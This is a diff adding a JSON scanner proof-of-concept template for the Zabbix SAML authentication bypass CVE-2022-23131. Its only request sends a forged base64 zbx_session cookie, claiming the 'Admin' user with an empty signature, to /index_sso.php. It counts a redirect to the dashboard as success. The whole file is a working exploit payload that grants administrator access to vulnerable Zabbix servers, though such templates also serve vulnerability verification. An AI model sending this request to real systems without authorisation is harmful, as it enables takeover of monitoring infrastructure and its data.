@@ -1,0 +1,40 @@
+{
+    "Name": "Zabbix SAML身份绕过漏洞",
+    "Description": "Zabbix SAML身份绕过漏洞 CVE-2022-23131",
+    "Product": "zabbix",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {
+            "Connection": "close",
+            "Cache-Control": "max-age=0",
+             "Upgrade-Insecure-Requests": "1",
+             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
+              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+               "Accept-Encoding": "gzip, deflate",
+             "Accept-Language": "zh-CN,zh;q=0.8",
+            "Cookie":"zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"},
+        "Uri":"/index_sso.php",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"location",
+                "Value": "action=dashboard.view"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "302"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
